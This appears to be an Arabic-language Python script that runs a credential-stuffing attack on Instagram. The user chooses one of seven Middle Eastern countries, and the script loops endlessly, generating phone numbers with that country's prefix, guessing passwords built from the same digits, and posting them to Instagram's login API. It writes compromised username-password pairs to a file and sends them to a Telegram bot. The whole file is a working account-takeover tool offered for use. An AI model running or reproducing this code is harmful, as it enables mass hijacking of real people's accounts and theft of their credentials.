import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser
        Z = '\x1b[2;31m'
        G = '\x1b[1;32m'
        A = '\033[2;39m'
        C = '\033[2;35m' 
        B = '\033[2;36m'
        C = '\033[2;35m' 
        sleep(2)
        
        P55 = pyfiglet.figlet_format('☆☆wael☆☆')
        print( C + P55)
        sleep(2)
        os.system('clear')
        P55 = pyfiglet.figlet_format('========>')
        print(  B + P55)
        sleep(3)
        webbrowser.open('https://youtu.be/DDVf_UJeYY0')
        os.system('clear')
        P55 = pyfiglet.figlet_format('========>')
        print(  C + P55)
        sleep(5)
        os.system('clear')      
        P55 = pyfiglet.figlet_format('========>')
        print(  G + P55)
        sleep(6)
        
        os.system('clear')
        P55 = pyfiglet.figlet_format('========>')
        print(  B + P55)
        sleep(15)
        
         
        os.system('clear')
        print(G+  """
  - - - - - - - - - - - - - - - - - - - - - - - - -  -  
                  _ 
__      ____ _  ___| |
\ \ /\ / / _` |/ _ \ |
 \ V  V / (_| |  __/ |
  \_/\_/ \__,_|\___|_|
    - - - - - - - - - - - - - - - - - - - - - - - - -  -  
        اشترك قنواتي يوتيوب و تيك توك وتيلجرام لكي تشتغل الاداه 
        - - - - - - - - - - - - - - - - - - - - - - - - -  -
        """)
      
        webbrowser.open('https://t.me/E999G')
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        aa = 0
        zz = 0
        E = '\x1b[1;31m'
        G = '\x1b[1;32m'
        S = '\x1b[1;33m'
        A = '\033[2;39m'
        C = '\033[2;35m' 
        Y = '\033[1;34m'
        ID = input(Y + '- ID Telegram »     ')
        sleep(0.1)
      
        print('\n')
        token = input(S + '- TOKEN Telegram »  ')
        print('\n')
        webbrowser.open('https://t.me/HORO4')
        a5tar = input(E + "اكتب باسورد:              ")
if a5tar == 'wael' : 
        print('='*40)
        
        ask = input(G+ '- 1 صيد على العراق 🇮🇶\n- 2 صيد على مصر🇪🇬                       \n- 3 صيد على الاردن🇯🇴                  \n- 4 صيد على سعوديه 🇸🇦              \n- 5 صيد على لبنانل🇱🇧                          \n- 6 صيد على ايران🇮🇷\n- 7 صيد على سوريا 🇸🇾\n- - =========================≈===\n- Pro,  اختر على اي دوله تصيد ضع رقم ⁦» ')
        print('='*40)
        w = 'https://pastebin.com/raw/V3V23pdR'
        start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=مطور علوش✅➕👌").json()
        id_msg = start_msg['result']['message_id']
        rss = requests.get(w).text
        if 'wael' in rss:
            sleep(0.1)
        r = requests.Session()
        user = '0987654321'
        if ask == '1':
            while True:
                us = str(''.join((random.choice(user) for i in range(8))))
                username = '+96477' + us
                password = '077' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                 'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid, 
                 'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + '- username => '+  username + ' | password =>' +  password)
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Hi Pro Fishing From Alosh‌‌\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n[=]Email =>  {username} \n[=]password =>  {password} \n- - - - - - - - - - - - - - - - - - - - - - - - - -\n By :- @BBBBBLL -: @HORO4 "
                    i = requests.post(tlg)
                    with open('insta.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + '- username S =>' + username + ' |  password => ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=Hi 🔍يتم الفحص  الان انتظر الصيد\n- - - - - - - - - - - - - - - - - - - - - - - - -\n✅Yes HiT pro [{zz}]\n- - - - - - - - - - - - - - - - - - - - - - - - \n⭕️NO HiT Pro \n🔍Email No 《 {username}  》=>  《{aa}》\n🔍password No《 {password} 》=> 《{aa}》\n- - - - - - - - - - - - - - - - - - - - - - - - - \n By :@BBBBBLL -: @HORO4 ")
                    print(E + '- username =>'+  username + ' | password =>' +  password)
                    aa += 1

        if ask == '2':
            while True:
                us = str(''.join((random.choice(user) for i in range(8))))
                username = '+2010' + us
                password = '010' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                 'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid, 
                 'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + '- username => '+  username + ' | password =>' +  password)
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Hi Pro Fishing From Alosh‌‌\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n[=]Email =>  {username} \n[=]password =>  {password} \n- - - - - - - - - - - - - - - - - - - - - - - - - -\n By :- @BBBBBLL -: @HORO4 "
                    i = requests.post(tlg)
                    with open('insta.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + '- username S =>' + username + ' |  password => ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=Hi 🔍يتم الفحص  الان انتظر الصيد\n- - - - - - - - - - - - - - - - - - - - - - - - -\n✅Yes HiT pro [{zz}]\n- - - - - - - - - - - - - - - - - - - - - - - - \n⭕️NO HiT Pro \n🔍Email No 《 {username}  》=>  《{aa}》\n🔍password No《 {password} 》=> 《{aa}》\n- - - - - - - - - - - - - - - - - - - - - - - - - \n By :@BBBBBLL -: @HORO4 ")
                    print(E + '- username =>'+  username + ' | password =>' +  password)
                    aa += 1

        if ask == '3':
            while True:
                us = str(''.join((random.choice(user) for i in range(7))))
                username = '+96278' + us
                password = '078' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                 'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid, 
                 'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + '- username => '+  username + ' | password =>' +  password)
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Hi Pro Fishing From Alosh‌‌\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n[=]Email =>  {username} \n[=]password =>  {password} \n- - - - - - - - - - - - - - - - - - - - - - - - - -\n By :- @BBBBBLL -: @HORO4 "
                    i = requests.post(tlg)
                    with open('insta.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + '- username S =>' + username + ' |  password => ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=Hi 🔍يتم الفحص  الان انتظر الصيد\n- - - - - - - - - - - - - - - - - - - - - - - - -\n✅Yes HiT pro [{zz}]\n- - - - - - - - - - - - - - - - - - - - - - - - \n⭕️NO HiT Pro \n🔍Email No 《 {username}  》=>  《{aa}》\n🔍password No《 {password} 》=> 《{aa}》\n- - - - - - - - - - - - - - - - - - - - - - - - - \n By :@BBBBBLL -: @HORO4 ")
                    print(E + '- username =>'+  username + ' | password =>' +  password)
                    aa += 1
        if ask == '4':
            while True:
                us = str(''.join((random.choice(user) for i in range(7))))
                username = '+96655' + us
                password = '055' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                 'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid, 
                 'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + '- username => '+  username + ' | password =>' +  password)
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Hi Pro Fishing From Alosh‌‌\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n[=]Email =>  {username} \n[=]password =>  {password} \n- - - - - - - - - - - - - - - - - - - - - - - - - -\n By :- @BBBBBLL -: @HORO4 "
                    i = requests.post(tlg)
                    with open('insta.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + '- username S =>' + username + ' |  password => ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=Hi 🔍يتم الفحص  الان انتظر الصيد\n- - - - - - - - - - - - - - - - - - - - - - - - -\n✅Yes HiT pro [{zz}]\n- - - - - - - - - - - - - - - - - - - - - - - - \n⭕️NO HiT Pro \n🔍Email No 《 {username}  》=>  《{aa}》\n🔍password No《 {password} 》=> 《{aa}》\n- - - - - - - - - - - - - - - - - - - - - - - - - \n By :@BBBBBLL -: @HORO4 ")
                    print(E + '- username =>'+  username + ' | password =>' +  password)
                    aa += 1
    
        if ask == '5':
            while True:
                us = str(''.join((random.choice(user) for i in range(6))))
                username = '+96176' + us
                password = '76' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                 'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid, 
                 'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + '- username => '+  username + ' | password =>' +  password)
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Hi Pro Fishing From Alosh‌‌\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n[=]Email =>  {username} \n[=]password =>  {password} \n- - - - - - - - - - - - - - - - - - - - - - - - - -\n By :- @BBBBBLL -: @HORO4 "
                    i = requests.post(tlg)
                    with open('insta.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + '- username S =>' + username + ' |  password => ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=Hi 🔍يتم الفحص  الان انتظر الصيد\n- - - - - - - - - - - - - - - - - - - - - - - - -\n✅Yes HiT pro [{zz}]\n- - - - - - - - - - - - - - - - - - - - - - - - \n⭕️NO HiT Pro \n🔍Email No 《 {username}  》=>  《{aa}》\n🔍password No《 {password} 》=> 《{aa}》\n- - - - - - - - - - - - - - - - - - - - - - - - - \n By :@BBBBBLL -: @HORO4 ")
                    print(E + '- username =>'+  username + ' | password =>' +  password)
                    aa += 1
        if ask == '6':
            while True:
                us = str(''.join((random.choice(user) for i in range(8))))
                username = '+9866' + us
                password = '66' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                 'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid, 
                 'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + '- username => '+  username + ' | password =>' +  password)
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Hi Pro Fishing From Alosh‌‌\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n[=]Email =>  {username} \n[=]password =>  {password} \n- - - - - - - - - - - - - - - - - - - - - - - - - -\n By :- @BBBBBLL -: @HORO4 "
                    i = requests.post(tlg)
                    with open('insta.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + '- username S =>' + username + ' |  password => ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=Hi 🔍يتم الفحص  الان انتظر الصيد\n- - - - - - - - - - - - - - - - - - - - - - - - -\n✅Yes HiT pro [{zz}]\n- - - - - - - - - - - - - - - - - - - - - - - - \n⭕️NO HiT Pro \n🔍Email No 《 {username}  》=>  《{aa}》\n🔍password No《 {password} 》=> 《{aa}》\n- - - - - - - - - - - - - - - - - - - - - - - - - \n By :@BBBBBLL -: @HORO4 ")
                    print(E + '- username =>'+  username + ' | password =>' +  password)
                    aa += 1
        if ask == '7':
            while True:
                us = str(''.join((random.choice(user) for i in range(8))))
                username = '+9639' + us
                password = '09' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                 'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid, 
                 'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + '- username => '+  username + ' | password =>' +  password)
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Hi Pro Fishing From Alosh‌‌\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n[=]Email =>  {username} \n[=]password =>  {password} \n- - - - - - - - - - - - - - - - - - - - - - - - - -\n By :- @BBBBBLL -: @HORO4 "
                    i = requests.post(tlg)
                    with open('insta.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + '- username S =>' + username + ' |  password => ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=Hi 🔍يتم الفحص  الان انتظر الصيد\n- - - - - - - - - - - - - - - - - - - - - - - - -\n✅Yes HiT pro [{zz}]\n- - - - - - - - - - - - - - - - - - - - - - - - \n⭕️NO HiT Pro \n🔍Email No 《 {username}  》=>  《{aa}》\n🔍password No《 {password} 》=> 《{aa}》\n- - - - - - - - - - - - - - - - - - - - - - - - - \n By :@BBBBBLL -: @HORO4 ")
                    print(E + '- username =>'+  username + ' | password =>' +  password)
                    aa += 1
        else:
            ()
